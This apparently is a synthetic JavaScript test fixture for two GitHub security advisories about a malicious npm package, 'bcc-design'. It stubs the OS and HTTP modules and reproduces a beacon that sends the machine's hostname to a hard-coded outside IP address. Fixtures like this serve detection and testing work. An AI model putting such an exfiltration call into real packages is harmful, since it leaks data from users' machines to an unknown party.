// Synthetic fixture for GHSA-v36x-48h2-hc4f / GHSA-73q2-99qx-v576.
const os = { hostname: () => "synthetic-host" };
const http = { get: (_url) => undefined };
http.get(
  "http://91.201.215.48:8000/npm-poc-bcc?hostname=" +
    os.hostname() +
    "&package=bcc-design",
);
